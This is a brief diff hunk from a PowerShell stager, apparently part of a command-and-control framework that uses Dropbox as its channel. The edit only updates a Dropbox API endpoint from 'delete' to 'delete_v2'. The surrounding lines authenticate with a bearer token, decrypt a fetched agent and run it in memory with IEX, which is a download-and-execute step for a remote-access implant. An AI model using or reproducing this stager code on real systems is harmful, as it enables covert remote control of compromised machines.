@@ -214,7 +214,7 @@ function Start-Negotiate {
     $wc2.Headers.Add("User-Agent",$UA);
     $wc2.Headers.Add("Authorization", "Bearer $T");
     $wc2.Headers.Add("Content-Type", " application/json");
-    $Null=$wc2.UploadString("https://api.dropboxapi.com/2/files/delete", "POST", "{`"path`":`"{{ staging_folder }}/$($ID)_4.txt`"}");
+    $Null=$wc2.UploadString("https://api.dropboxapi.com/2/files/delete_v2", "POST", "{`"path`":`"{{ staging_folder }}/$($ID)_4.txt`"}");
 
     # decrypt the agent and register the agent logic
     IEX $( $e.GetString($(Decrypt-Bytes -Key $key -In $raw)) );
